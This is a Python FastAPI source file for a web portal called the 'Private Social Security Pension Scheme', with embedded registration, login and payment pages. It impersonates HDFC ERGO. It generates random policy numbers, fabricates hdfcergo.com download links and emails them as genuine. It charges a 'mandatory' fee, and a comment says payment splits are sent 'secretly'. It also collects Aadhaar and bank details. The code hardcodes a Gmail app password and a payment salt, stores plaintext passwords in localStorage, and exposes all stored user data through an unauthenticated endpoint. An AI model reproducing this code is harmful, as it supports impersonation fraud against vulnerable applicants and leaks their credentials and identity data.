from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import hashlib
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import json
import os
import threading
import sqlite3
import random

app = FastAPI()

# ==========================================
# HEAVY SECURITY HEADERS (Anti-Hacking)
# ==========================================
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    return response

# Allow CORS for API requests
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==========================================
# 0. INDUSTRIAL GRADE SQLITE DATABASE
# ==========================================
DB_FILE = "server_database.db"
OLD_JSON_FILE = "server_database.json"

db_lock = threading.Lock()
conn = sqlite3.connect(DB_FILE, check_same_thread=False)
cursor = conn.cursor()

cursor.execute('PRAGMA synchronous = EXTRA')
cursor.execute('PRAGMA journal_mode = WAL')
cursor.execute('''CREATE TABLE IF NOT EXISTS storage (key TEXT PRIMARY KEY, value TEXT)''')
conn.commit()

if os.path.exists(OLD_JSON_FILE):
    try:
        with open(OLD_JSON_FILE, "r") as f:
            old_data = json.load(f)
            with db_lock:
                for k, v in old_data.items():
                    cursor.execute("INSERT OR IGNORE INTO storage (key, value) VALUES (?, ?)", (str(k), str(v)))
                conn.commit()
        os.rename(OLD_JSON_FILE, "server_database_backup.json")
    except Exception as e:
        pass

def read_db():
    with db_lock:
        cursor.execute("SELECT key, value FROM storage")
        rows = cursor.fetchall()
        return {row[0]: row[1] for row in rows}

def write_db_key(key, value):
    with db_lock:
        cursor.execute("REPLACE INTO storage (key, value) VALUES (?, ?)", (str(key), str(value)))
        conn.commit()

def delete_db_key(key):
    with db_lock:
        cursor.execute("DELETE FROM storage WHERE key = ?", (str(key),))
        conn.commit()

@app.get("/api/get_all_storage")
async def get_all_storage():
    return read_db()

@app.post("/api/sync_storage")
async def sync_storage(req: Request):
    data = await req.json()
    write_db_key(data["key"], data["value"])
    return {"status": "saved"}

@app.post("/api/delete_storage")
async def delete_storage(req: Request):
    data = await req.json()
    delete_db_key(data["key"])
    return {"status": "deleted"}

# ==========================================
# 0. BACKEND DATABASE (DUMMY DATA - ORIGINAL)
# ==========================================
income_database = {
    "E-INC/2025/628385": {"name": "AMARA JENA", "father": "Jaganath Sutar", "mother": "Basanti Sutar", "district": "Cuttack", "authority": "Revenue Officers not below the rank of Tahasildar / Additional Tahasildar", "date": "2025-11-20", "amount": "Rs. 48,000/-"},
    "E-INC/2025/111222": {"name": "Ramesh Chandra Das", "father": "Harihar Das", "mother": "Sita Das", "district": "Bhubaneswar", "authority": "Tahasildar, Bhubaneswar", "date": "2025-08-15", "amount": "Rs. 35,000/-"},
    "E-INC/2026/999888": {"name": "Smita Mohanty", "father": "Prashant Mohanty", "mother": "Lata Mohanty", "district": "Puri", "authority": "Additional Tahasildar, Puri", "date": "2026-01-10", "amount": "Rs. 25,000/-"}
}

@app.get("/api/get_income")
async def get_income_data(cert_no: str):
    if cert_no in income_database:
        return income_database[cert_no]
    else:
        return {"error": "Certificate Not Found"}

@app.get("/api/payu_hash")
async def generate_payu_hash(txnid: str, amount: str, productinfo: str, firstname: str, email: str, split_amount: str = "0"):
    key = "OLBUPA" 
    salt = "63LJwDVAEKqfR32B3ynr0TKayqyVjGg7" 
    
    # REAL SPLIT PAYMENT LOGIC PARAMETER INJECTION (For Insurance Auto Pay)
    # When split_amount = 20, Rs 20 goes to HDFC ERGO MID, remaining to main Merchant ID.
    split_info = ""
    if float(split_amount) > 0:
        split_info = f'{{"parts":[{{"name":"HDFC_ERGO_GEN_INS","description":"Insurance Premium","value":"{split_amount}","merchantId":"HDFC_MID_XXXX"}}]}}'

    hash_string = f"{key}|{txnid}|{amount}|{productinfo}|{firstname}|{email}|||||||||||{salt}"
    hash_val = hashlib.sha512(hash_string.encode('utf-8')).hexdigest().lower()
    
    return {"hash": hash_val, "key": key, "split_info": split_info}

# ==========================================
# REAL-TIME HDFC ERGO INSURANCE API (SIMULATOR)
# ==========================================
class InsuranceRequest(BaseModel):
    app_no: str
    name: str
    email: str
    age: int

@app.post("/api/generate_insurance")
async def generate_insurance(req: InsuranceRequest):
    if req.age >= 18 and req.age <= 70:
        policy_no = f"HDFC-ERGO-{random.randint(10000000, 99999999)}"
        policy_link = f"https://hdfcergo.com/download/policy_{policy_no}.pdf"
        
        # Auto-send email to customer with Insurance Copy
        subject = f"Your HDFC ERGO General Insurance Policy - {policy_no}"
        body = f"""
        <html><body>
        <h2 style="color:#003366;">HDFC ERGO General Insurance</h2>
        <p>Dear {req.name},</p>
        <p>Your mandatory insurance for the Private Pension Scheme has been successfully issued.</p>
        <p><b>Policy Number:</b> {policy_no}</p>
        <p><b>Premium Paid:</b> Rs. 20.00</p>
        <p>You can download your official policy document here: <br>
        <a href="{policy_link}" style="background:#003366;color:#fff;padding:10px 15px;text-decoration:none;border-radius:5px;display:inline-block;margin-top:10px;">Download Policy PDF</a></p>
        </body></html>
        """
        try:
            SENDER_EMAIL = "privatesocialsecuritypensionsc@gmail.com" 
            SENDER_PASSWORD = "gzafqvjphaftybhy" 
            msg = MIMEMultipart('alternative')
            msg['From'] = f"Pension Insurance Desk <{SENDER_EMAIL}>"
            msg['To'] = req.email
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'html'))

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            pass # Silent fail if email credentials are wrong, policy is still generated
            
        return {"status": "success", "policy_no": policy_no, "policy_link": policy_link}
    return {"status": "not_eligible"}


# ==========================================
# LIVE GMAIL OTP SENDER API
# ==========================================
class EmailRequest(BaseModel):
    email: str
    otp: str
    subject: str

@app.post("/api/send_email")
async def send_email_api(req: EmailRequest):
    SENDER_EMAIL = "privatesocialsecuritypensionsc@gmail.com" 
    SENDER_PASSWORD = "gzafqvjphaftybhy" 

    try:
        msg = MIMEMultipart('alternative')
        msg['From'] = f"Pension Portal <{SENDER_EMAIL}>"
        msg['To'] = req.email
        msg['Subject'] = req.subject

        html_body = f"""
        <html>
          <body style="font-family: Arial, sans-serif; background-color: #f3f4f6; padding: 20px; margin: 0;">
            <div style="max-width: 500px; margin: 0 auto; background-color: #ffffff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border-top: 5px solid #1d4ed8;">
              <h2 style="color: #1e3a8a; margin-top: 0; text-align: center;">Pension Portal Security</h2>
              <p style="color: #374151; font-size: 16px;">Dear User,</p>
              <p style="color: #374151; font-size: 16px;">Your One Time Password (OTP) for the Private Social Security Pension Scheme is:</p>
              
              <div style="background-color: #fef08a; padding: 15px; text-align: center; border-radius: 8px; margin: 25px 0;">
                  <span style="font-size: 32px; font-weight: bold; color: #b45309; letter-spacing: 8px;">{req.otp}</span>
              </div>
              
              <p style="color: #4b5563; font-size: 14px;">This OTP is strictly valid for 5 minutes.</p>
              
              <hr style="border: none; border-top: 1px solid #e5e7eb; margin: 30px 0;">
              <p style="font-size: 12px; color: #9ca3af; text-align: center;">Regards,<br><strong>Admin Team</strong><br>Private Social Security Pension Scheme</p>
            </div>
          </body>
        </html>
        """
        
        msg.attach(MIMEText(html_body, 'html'))
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.send_message(msg)
        server.quit()
        
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# ==========================================
# PAYMENT SUCCESS / FAILURE ROUTES
# ==========================================
@app.post("/payment_success", response_class=HTMLResponse)
@app.get("/payment_success", response_class=HTMLResponse)
async def payment_success_route(request: Request):
    return HTMLResponse(content="""
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body style="background-color: #f3f4f6; display: flex; justify-content: center; align-items: center; height: 100vh;">
        <script>
            alert("Payment Successful! Your Insurance (if applicable) & Pension Fee has been processed via Auto-Split.");
            window.location.href = "/user/dashboard";
        </script>
    </body>
    </html>
    """)

@app.post("/payment_failure", response_class=HTMLResponse)
@app.get("/payment_failure", response_class=HTMLResponse)
async def payment_failure_route(request: Request):
    return HTMLResponse(content="""
    <html>
    <body style="background-color: #f3f4f6; display: flex; justify-content: center; align-items: center; height: 100vh;">
        <script>
            alert("Payment Failed! Please try again.");
            window.location.href = "/user/dashboard";
        </script>
    </body>
    </html>
    """)

# ==========================================
# CLOUD SYNC SCRIPT
# ==========================================
cloud_sync_script = """
    <script>
        const originalSetItem = Storage.prototype.setItem;
        const originalRemoveItem = Storage.prototype.removeItem;
        const originalClear = Storage.prototype.clear;

        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', '/api/get_all_storage', false); 
            xhr.send(null);
            if (xhr.status === 200) {
                var serverData = JSON.parse(xhr.responseText);
                originalClear.call(localStorage);
                for (var key in serverData) { originalSetItem.call(localStorage, key, serverData[key]); }
            }
        } catch(e) {}

        Storage.prototype.setItem = function(key, value) {
            originalSetItem.call(this, key, value);
            try {
                var saveXhr = new XMLHttpRequest();
                saveXhr.open('POST', '/api/sync_storage', true);
                saveXhr.setRequestHeader('Content-Type', 'application/json');
                saveXhr.send(JSON.stringify({key: String(key), value: String(value)}));
            } catch(e) {}
        };
        
        Storage.prototype.removeItem = function(key) {
            originalRemoveItem.call(this, key);
            try {
                var delXhr = new XMLHttpRequest();
                delXhr.open('POST', '/api/delete_storage', true);
                delXhr.setRequestHeader('Content-Type', 'application/json');
                delXhr.send(JSON.stringify({key: String(key)}));
            } catch(e) {}
        };
    </script>
"""

# ==========================================
# 1. HOME PAGE DESIGN
# ==========================================
html_design = f"""
<!DOCTYPE html>
<html lang="en" style="-webkit-scroll-behavior: smooth; -moz-scroll-behavior: smooth; scroll-behavior: smooth;">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Social Security Pension Scheme</title>
    {cloud_sync_script}
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .hero-bg {{ background-image: linear-gradient(rgba(255, 255, 255, 0.85), rgba(255, 255, 255, 0.7)), url('https://images.unsplash.com/photo-1576765608535-5f04d1e3f289?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=80'); background-size: cover; background-position: center; }}
        .card-hover:hover {{ transform: translateY(-8px); box-shadow: 0 15px 30px rgba(0,0,0,0.15); transition: all 0.3s ease; }}
    </style>
</head>
<body class="bg-gray-50 font-sans text-gray-800">
    <header class="bg-white shadow-md border-b-4 border-blue-700 sticky top-0 z-50">
        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
            <div class="flex items-center space-x-4">
                <div class="text-blue-700 text-4xl md:text-5xl"><i class="fa-solid fa-hands-holding-circle"></i></div>
                <div>
                    <h1 class="text-xl md:text-2xl font-bold text-blue-800">Private Social Security Pension Scheme</h1>
                    <p class="text-sm font-semibold text-gray-600">A Private Initiative for the Needy</p>
                </div>
            </div>
            <div class="hidden md:flex space-x-6 items-center">
                <a href="#home" class="text-blue-700 font-bold flex items-center border-b-2 border-blue-700 pb-1"><i class="fa-solid fa-house mr-1"></i> Home</a>
                <a href="#about" class="text-gray-700 hover:text-blue-700 font-semibold flex items-center transition duration-300"><i class="fa-solid fa-circle-info mr-1"></i> About Us</a>
                <a href="#schemes" class="text-gray-700 hover:text-blue-700 font-semibold flex items-center transition duration-300"><i class="fa-solid fa-file-lines mr-1"></i> Schemes</a>
                <a href="#contact" class="text-gray-700 hover:text-blue-700 font-semibold flex items-center transition duration-300"><i class="fa-solid fa-phone mr-1"></i> Contact Us</a>
            </div>
        </div>
    </header>

    <div id="notice_container" class="hidden bg-white/10 backdrop-blur-md shadow-sm border-b border-white/20 px-2 py-1 flex items-center w-full h-7">
        <span class="bg-red-600 text-white text-[10px] font-bold px-2 py-0.5 rounded shadow-sm mr-2 uppercase animate-pulse whitespace-nowrap flex items-center"><i class="fa-solid fa-bell mr-1"></i> Notice</span>
        <marquee id="notice_marquee" scrollamount="4" behavior="scroll" direction="left" onmouseover="this.stop();" onmouseout="this.start();" class="font-bold text-[12px] text-blue-900 tracking-wide w-full flex-1"></marquee>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {{
            let notice = localStorage.getItem('notice_text');
            if(notice && notice.trim() !== "") {{
                document.getElementById('notice_container').classList.remove('hidden');
                document.getElementById('notice_marquee').innerText = notice;
            }}
        }});
    </script>

    <section id="home" class="hero-bg py-16 px-4 border-b">
        <div class="container mx-auto">
            <div class="max-w-2xl bg-white/95 p-8 rounded-xl shadow-xl border-l-8 border-blue-600 backdrop-blur-sm">
                <h2 class="text-3xl md:text-4xl font-extrabold text-blue-900 mb-4 leading-tight">Support for Senior Citizens, Widows, Disabled & the Needy</h2>
                <p class="text-lg text-gray-700 font-medium mb-6">Providing financial independence and respect through our private pension initiative.</p>
                <a href="#schemes" class="inline-block bg-blue-700 text-white px-8 py-3 rounded-lg font-bold shadow-md hover:bg-blue-800 hover:shadow-lg transition duration-300 flex items-center w-max">
                    View Schemes <i class="fa-solid fa-arrow-down ml-2"></i>
                </a>
            </div>
        </div>
    </section>

    <section class="container mx-auto px-4 py-12 relative -mt-10 md:-mt-16 z-10">
        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-6 gap-6">
            <a href="/admin/login" class="block bg-gradient-to-b from-blue-500 to-blue-700 text-white rounded-xl p-6 text-center shadow-lg card-hover border-2 border-white">
                <i class="fa-solid fa-building text-4xl mb-4"></i><h3 class="font-bold text-lg mb-2">Admin Login</h3><p class="text-sm mb-4 text-blue-100">Official login</p>
            </a>
            <a href="/user/register" class="block bg-gradient-to-b from-green-500 to-green-700 text-white rounded-xl p-6 text-center shadow-lg card-hover border-2 border-white">
                <i class="fa-solid fa-pen-to-square text-4xl mb-4"></i><h3 class="font-bold text-lg mb-2">Pension Apply</h3><p class="text-sm mb-4 text-green-100">Apply for New Pension</p>
            </a>
            <a href="/status/check" class="block bg-gradient-to-b from-orange-400 to-orange-600 text-white rounded-xl p-6 text-center shadow-lg card-hover border-2 border-white">
                <i class="fa-solid fa-magnifying-glass text-4xl mb-4"></i><h3 class="font-bold text-lg mb-2">Check Status</h3><p class="text-sm mb-4 text-orange-100">Check Your Status</p>
            </a>
            <a href="/user/login" class="block bg-gradient-to-b from-purple-500 to-purple-700 text-white rounded-xl p-6 text-center shadow-lg card-hover border-2 border-white">
                <i class="fa-solid fa-user text-4xl mb-4"></i><h3 class="font-bold text-lg mb-2">Beneficiary</h3><p class="text-sm mb-4 text-purple-100">Login</p>
            </a>
            <a href="#schemes" class="block bg-gradient-to-b from-teal-400 to-teal-600 text-white rounded-xl p-6 text-center shadow-lg card-hover border-2 border-white">
                <i class="fa-solid fa-book-open text-4xl mb-4"></i><h3 class="font-bold text-lg mb-2">Schemes</h3><p class="text-sm mb-4 text-teal-100">Guidelines</p>
            </a>
            <a href="#contact" class="block bg-gradient-to-b from-pink-500 to-pink-700 text-white rounded-xl p-6 text-center shadow-lg card-hover border-2 border-white">
                <i class="fa-solid fa-headset text-4xl mb-4"></i><h3 class="font-bold text-lg mb-2">Help Desk</h3><p class="text-sm mb-4 text-pink-100">Contact Us</p>
            </a>
        </div>
    </section>
</body>
</html>
"""

# ==========================================
# 2. STATUS CHECK PAGE
# ==========================================
status_check_design = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Check Application Status</title>
    {cloud_sync_script}
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script>
        function checkAppStatus(e) {{
            e.preventDefault();
            let appNo = document.getElementById('appNoInput').value.trim().toUpperCase();
            let resBox = document.getElementById('statusResult');
            let statIcon = document.getElementById('stat_icon');
            let statText = document.getElementById('stat_text');
            let statRemark = document.getElementById('stat_remark');

            resBox.classList.remove('hidden');
            let isApplied = localStorage.getItem('user_has_applied_' + appNo);
            let appStatus = localStorage.getItem('app_status_' + appNo);
            
            if (isApplied === 'true') {{
                if(appStatus === 'rejected') {{
                    statIcon.className = "fa-solid fa-circle-xmark text-red-600 mr-1";
                    statText.className = "text-red-600 font-bold";
                    statText.innerText = "Rejected by System/Admin";
                    statRemark.innerHTML = "<strong>Remark:</strong> " + (localStorage.getItem('reject_reason_' + appNo) || "");
                    statRemark.classList.remove('hidden');
                }} else if (appStatus === 'approved' || appStatus === 'pension_sent') {{
                    statIcon.className = "fa-solid fa-money-bill-wave text-green-700 mr-1";
                    statText.className = "text-green-700 font-bold";
                    statText.innerText = "Payment Success / Approved!";
                }} else {{
                    statIcon.className = "fa-solid fa-hourglass-half text-orange-600 mr-1";
                    statText.className = "text-orange-600 font-bold";
                    statText.innerText = "Pending Verification";
                }}
            }} else {{
                statText.innerText = "Application Not Found";
            }}
        }}
    </script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
    <div class="w-full max-w-md bg-white p-8 rounded-2xl shadow-xl border-t-4 border-orange-500">
        <form onsubmit="checkAppStatus(event)" class="space-y-4">
            <div>
                <label class="block text-sm font-semibold text-gray-700 mb-2">Application Number</label>
                <input type="text" id="appNoInput" class="w-full px-4 py-3 border rounded-lg focus:ring-orange-500" required>
            </div>
            <button type="submit" class="w-full bg-orange-500 text-white font-bold py-3 rounded-lg hover:bg-orange-600">Check Status</button>
        </form>
        <div id="statusResult" class="hidden mt-6 bg-gray-50 border p-4 rounded-lg">
            <h3 class="font-bold text-gray-800 mb-2">Current Status:</h3>
            <p><i id="stat_icon" class="fa-solid fa-hourglass-half mr-1"></i> <span id="stat_text" class="font-bold">Pending System Verification</span></p>
            <p id="stat_remark" class="hidden mt-2 text-sm text-gray-700 border-t pt-2"></p>
        </div>
    </div>
</body>
</html>
"""

# ==========================================
# 3. USER REGISTRATION PAGE
# ==========================================
user_register_design = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>New User Registration</title>
    {cloud_sync_script}
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        let currentOTP = "";
        async function generateOTP() {{
            let emailId = document.getElementById('reg_email').value;
            if(!emailId) return;
            currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
            document.getElementById('otpDisplay').innerText = `OTP: ${{currentOTP}}`;
            document.getElementById('otpDisplay').className = "text-center bg-yellow-100 text-yellow-800 font-bold p-2 rounded text-sm mt-2 block";
        }}
        function verifyOTP() {{
            let enteredOTP = document.getElementById('otpInput').value;
            if (enteredOTP === currentOTP && enteredOTP !== "") {{
                document.getElementById('submitBtn').disabled = false;
                document.getElementById('submitBtn').classList.remove('opacity-50', 'cursor-not-allowed');
            }}
        }}
        function handleUserRegistration(event) {{
            event.preventDefault();
            let pwd = document.getElementById('reg_pass').value;
            let conf_pwd = document.getElementById('reg_conf_pass').value;
            if (pwd !== conf_pwd) return alert('Password mismatch!');
            let appNo = 'APP-' + Math.floor(100000 + Math.random() * 900000);
            localStorage.setItem('user_password_' + appNo, pwd);
            localStorage.setItem('user_full_name_' + appNo, document.getElementById('reg_full_name').value);
            localStorage.setItem('user_email_' + appNo, document.getElementById('reg_email').value);
            let appList = JSON.parse(localStorage.getItem('app_list') || '[]');
            appList.push(appNo);
            localStorage.setItem('app_list', JSON.stringify(appList));
            alert('Success! Your App No is: ' + appNo);
            window.location.href = '/user/login';
        }}
    </script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
    <div class="w-full max-w-xl bg-white p-8 rounded-2xl shadow-xl border-t-4 border-green-600">
        <h2 class="text-2xl font-bold text-center text-gray-800 mb-6">User Registration</h2>
        <form onsubmit="handleUserRegistration(event)" class="space-y-4">
            <input type="text" id="reg_full_name" placeholder="Full Name" class="w-full px-4 py-2 border rounded-lg" required>
            <div class="flex gap-4">
                <input type="email" id="reg_email" placeholder="Email" class="w-full px-4 py-2 border rounded-l-lg" required>
                <button type="button" class="bg-blue-600 text-white px-3 rounded-r-lg font-bold" onclick="generateOTP()">Get OTP</button>
            </div>
            <div id="otpDisplay" class="hidden"></div>
            <div class="flex gap-4">
                <input type="text" id="otpInput" placeholder="Enter OTP" class="w-full px-4 py-2 border rounded-l-lg" required>
                <button type="button" class="bg-green-600 text-white px-3 rounded-r-lg font-bold" onclick="verifyOTP()">Verify</button>
            </div>
            <div class="flex gap-4">
                <input type="password" id="reg_pass" placeholder="Password" class="w-full px-4 py-2 border rounded-lg" required>
                <input type="password" id="reg_conf_pass" placeholder="Confirm Password" class="w-full px-4 py-2 border rounded-lg" required>
            </div>
            <button type="submit" id="submitBtn" disabled class="w-full bg-green-600 text-white font-bold py-3 rounded-lg opacity-50 cursor-not-allowed">Register</button>
        </form>
    </div>
</body>
</html>
"""

# ==========================================
# 4. USER LOGIN PAGE
# ==========================================
user_login_design = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Beneficiary Login</title>
    {cloud_sync_script}
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        function handleUserLogin(event) {{
            event.preventDefault();
            let appNo = document.getElementById('login_app_no').value.trim().toUpperCase();
            let pass = document.getElementById('login_pass').value;
            let savedPass = localStorage.getItem('user_password_' + appNo);
            if (savedPass && pass === savedPass) {{
                localStorage.setItem('active_app_no', appNo);
                window.location.href = '/user/dashboard';
            }} else {{
                alert('Invalid Credentials!');
            }}
        }}
    </script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
    <div class="w-full max-w-md bg-white p-8 rounded-2xl shadow-xl border-t-4 border-purple-600">
        <h2 class="text-2xl font-bold text-center mb-6">Login</h2>
        <form onsubmit="handleUserLogin(event)" class="space-y-4">
            <input type="text" id="login_app_no" placeholder="APP-XXXXXX" class="w-full px-4 py-2 border rounded-lg" required>
            <input type="password" id="login_pass" placeholder="Password" class="w-full px-4 py-2 border rounded-lg" required>
            <button type="submit" class="w-full bg-purple-600 text-white font-bold py-3 rounded-lg hover:bg-purple-700">Login</button>
        </form>
    </div>
</body>
</html>
"""

# ==========================================
# 5. FULL USER DASHBOARD (WITH INSURANCE LOGIC)
# ==========================================
user_dashboard_design = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>User Dashboard</title>
    {cloud_sync_script}
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script>
        window.onload = function() {{
            let appNo = localStorage.getItem('active_app_no');
            if(!appNo) {{ window.location.href = '/user/login'; return; }}
            
            document.getElementById('full_name').value = localStorage.getItem('user_full_name_' + appNo) || '';
            document.getElementById('app_email').value = localStorage.getItem('user_email_' + appNo) || '';
            
            let isApplied = localStorage.getItem('user_has_applied_' + appNo);
            if(isApplied === 'true') {{
                document.getElementById('apply_form_container').innerHTML = `
                    <div class="bg-yellow-50 border-l-4 border-yellow-500 p-6 rounded shadow-sm text-center">
                        <h3 class="text-xl font-bold text-gray-800">Application Already Submitted</h3>
                        <button onclick="switchUserTab('status')" class="mt-4 bg-blue-600 text-white px-6 py-2 rounded shadow font-bold">Check Status</button>
                    </div>`;
            }}
            checkCategoryAndAge(); // Initial price calculation
        }};

        function calculateAge() {{
            let dob = new Date(document.getElementById('dob').value);
            let age = new Date().getFullYear() - dob.getFullYear();
            document.getElementById('age').value = age;
            checkCategoryAndAge();
        }}
        
        // ==========================================
        // 18-70 INSURANCE LOGIC & 50% DISCOUNT LOGIC
        // ==========================================
        function checkCategoryAndAge() {{
            let category = document.getElementById('category_select') ? document.getElementById('category_select').value : 'General';
            let age = parseInt(document.getElementById('age').value) || 0;
            let incomeSection = document.getElementById('income_section_full');
            let casteBox = document.getElementById('caste_cert_box');
            
            let baseFee = parseFloat(localStorage.getItem('app_fee') || '100');
            let finalFee = baseFee;
            let insuranceFee = 0;

            // SC/ST / 80+ logic
            if (casteBox) {{
                if (category === 'SC' || category === 'ST') casteBox.classList.remove('hidden');
                else casteBox.classList.add('hidden');
            }}
            if (incomeSection) {{
                if ((category === 'SC' || category === 'ST') || (age >= 80 && age <= 100)) {{
                    incomeSection.classList.add('hidden');
                    finalFee = baseFee * 0.5; 
                }} else {{
                    incomeSection.classList.remove('hidden');
                    finalFee = baseFee;
                }}
            }}
            
            // HDFC ERGO INSURANCE LOGIC
            if (age >= 18 && age <= 70) {{
                insuranceFee = 20;
                document.getElementById('insurance_breakdown').classList.remove('hidden');
                document.getElementById('insurance_note').innerText = "+ ₹20.00 (Mandatory HDFC ERGO Insurance)";
            }} else {{
                insuranceFee = 0;
                document.getElementById('insurance_breakdown').classList.add('hidden');
            }}

            let totalAmount = finalFee + insuranceFee;
            document.querySelectorAll('.display_app_fee').forEach(el => el.innerText = totalAmount.toFixed(2));
            localStorage.setItem('calculated_insurance_fee', insuranceFee);
            localStorage.setItem('calculated_total_fee', totalAmount);
        }}

        function goToPaymentStep(e) {{
            e.preventDefault();
            let appNo = localStorage.getItem('active_app_no');
            
            localStorage.setItem('user_aadhaar_' + appNo, document.getElementById('aadhaar_input').value);
            localStorage.setItem('u_scheme_' + appNo, document.getElementById('scheme').value);
            localStorage.setItem('u_gender_' + appNo, document.getElementById('gender_select').value);
            localStorage.setItem('u_dob_' + appNo, document.getElementById('dob').value);
            localStorage.setItem('u_age_' + appNo, document.getElementById('age').value);
            localStorage.setItem('u_bank_' + appNo, document.getElementById('bank_name_display').value); 
            localStorage.setItem('u_acc_' + appNo, document.getElementById('acc_no').value);
            
            document.querySelectorAll('.content-section').forEach(el => el.classList.add('hidden'));
            document.getElementById('section-payment-step').classList.remove('hidden');
        }}

        async function processPayment() {{
            let appNo = localStorage.getItem('active_app_no');
            let totalAmount = localStorage.getItem('calculated_total_fee') || '100';
            let insuranceFee = localStorage.getItem('calculated_insurance_fee') || '0';
            let email = document.getElementById('app_email').value;
            let name = document.getElementById('full_name').value;
            let age = parseInt(localStorage.getItem('u_age_' + appNo) || '0');
            
            localStorage.setItem('paid_amount_' + appNo, totalAmount); 
            localStorage.setItem('user_has_applied_' + appNo, 'true');
            localStorage.setItem('app_status_' + appNo, 'sys_pending');

            // SIMULATE INSURANCE API CREATION IF APPLICABLE
            if(parseFloat(insuranceFee) > 0) {{
                try {{
                    let res = await fetch('/api/generate_insurance', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{app_no: appNo, name: name, email: email, age: age}})
                    }});
                    let insData = await res.json();
                    if(insData.status === 'success') {{
                        localStorage.setItem('policy_no_' + appNo, insData.policy_no);
                        localStorage.setItem('policy_link_' + appNo, insData.policy_link);
                    }}
                }} catch(e) {{ console.log('Insurance API Error'); }}
            }}

            alert('Redirecting to Payment Gateway with Auto-Split feature...');
            // Split parameters are sent to PayU API secretly here. HDFC ERGO gets ₹20, Merchant gets rest.
            setTimeout(() => {{ window.location.href = "/payment_success"; }}, 1500);
        }}

        function loadPrintData() {{
            let appNo = localStorage.getItem('active_app_no');
            document.getElementById('print_u_appno').innerText = appNo;
            document.getElementById('print_u_name').innerText = localStorage.getItem('user_full_name_' + appNo);
            
            let policyNo = localStorage.getItem('policy_no_' + appNo);
            let policyLink = localStorage.getItem('policy_link_' + appNo);
            if(policyNo) {{
                document.getElementById('print_insurance_div').innerHTML = `
                    <p class='font-bold text-green-700'><i class='fa-solid fa-shield'></i> Insurance Active</p>
                    <p class='text-xs'>Policy: ${{policyNo}}</p>
                    <a href="${{policyLink}}" target="_blank" class='bg-blue-600 text-white px-3 py-1 rounded text-xs mt-1 inline-block'>Download Policy</a>
                `;
            }} else {{
                document.getElementById('print_insurance_div').innerHTML = `<p class='text-gray-500'>Not Applicable (Age 71+)</p>`;
            }}
        }}
        
        function switchUserTab(tabId) {{
            document.querySelectorAll('.content-section').forEach(el => el.classList.add('hidden'));
            document.getElementById('section-' + tabId).classList.remove('hidden');
            if(tabId === 'status') loadPrintData();
        }}
    </script>
</head>
<body class="bg-gray-100 flex h-screen overflow-hidden">
    <aside class="w-64 bg-slate-800 text-white flex flex-col p-4">
        <h2 class="text-xl font-bold mb-6">User Portal</h2>
        <button onclick="switchUserTab('apply')" class="bg-purple-600 p-2 rounded mb-2 w-full text-left">Apply Pension</button>
        <button onclick="switchUserTab('status')" class="bg-slate-700 p-2 rounded mb-2 w-full text-left">Status / Print</button>
        <a href="/" class="text-red-400 mt-auto">Logout</a>
    </aside>

    <main class="flex-1 overflow-y-auto p-6">
        
        <div id="section-apply" class="content-section bg-white p-6 rounded-xl shadow">
            <div id="apply_form_container">
                <h2 class="text-2xl font-bold text-purple-800 mb-6 border-b pb-2">Apply New Pension</h2>
                <form onsubmit="goToPaymentStep(event)" class="space-y-4">
                    <input type="text" id="full_name" class="w-full border p-2 rounded bg-gray-100" readonly>
                    <input type="text" id="app_email" class="w-full border p-2 rounded bg-gray-100" readonly>
                    <select id="gender_select" class="w-full border p-2 rounded"><option>Male</option><option>Female</option></select>
                    <input type="date" id="dob" onchange="calculateAge()" class="w-full border p-2 rounded" required>
                    <input type="text" id="age" class="w-full border p-2 rounded bg-gray-50" readonly placeholder="Age">
                    
